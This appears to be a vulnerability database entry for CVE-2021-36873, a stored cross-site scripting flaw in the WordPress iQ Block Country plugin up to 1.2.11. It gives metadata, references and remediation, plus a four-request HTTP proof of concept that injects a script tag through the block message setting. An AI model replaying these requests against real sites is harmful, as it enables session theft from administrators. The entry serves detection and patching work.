---
layout: post
cve_id: CVE-2021-36873
title: WordPress iQ Block Country <=1.2.11 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-36873.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-36873.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: medium
impact: 'Authenticated attackers can inject malicious JavaScript via stored XSS in
  the block message field, potentially stealing administrator session cookies or accessing
  plugin configuration data.

  '
remediation: 'Update to the latest version of the WordPress iQ Block Country plugin
  (>=1.2.12) to mitigate this vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/ba93f085-2153-439b-9cda-7c5b09d3ed58
- https://wordpress.org/plugins/iq-block-country/
- https://patchstack.com/database/vulnerability/iq-block-country-/wordpress-iq-block-country-plugin-1-2-11-authenticated-persistent-cross-site-scripting-xss-vulnerability
- https://nvd.nist.gov/vuln/detail/CVE-2021-36873
- https://wordpress.org/plugins/iq-block-country/#developers
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 5.4
  cve-id: CVE-2021-36873
  cwe-id: CWE-79
  epss-score: 0.03985
  epss-percentile: 0.88065
  cpe: cpe:2.3:a:webence:iq_block_country:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 4
  vendor: webence
  product: iq_block_country
  framework: wordpress
tags:
- cve
- cve2021
- wp-plugin
- iq-block-country
- wordpress
- wp
- xss
- authenticated
- wpscan
- webence
- vuln
---

## üîç Vulnerability Description
WordPress iQ Block Country plugin 1.2.11 and prior contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.


## üåê HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=lUT1wu&pwd=O3ttzB&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/options-general.php?page=iq-block-country%2Flibs%2Fblockcountry-settings.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/options.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 513
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

option_page=iqblockcountry-settings-group&action=update&_wpnonce=Mk8alC&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Diq-block-country%2Flibs%2Fblockcountry-settings.php&blockcountry_blockmessage=test</textarea><script>alert(document.domain)</script>&blockcountry_redirect=2&blockcountry_redirect_url=&blockcountry_header=on&blockcountry_nrstatistics=15&blockcountry_daysstatistics=30&blockcountry_geoapikey=&blockcountry_apikey=&blockcountry_ipoverride=NONE&blockcountry_debuglogging=on
```

```nohighlight
GET /wp-admin/options-general.php?page=iq-block-country%2Flibs%2Fblockcountry-settings.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

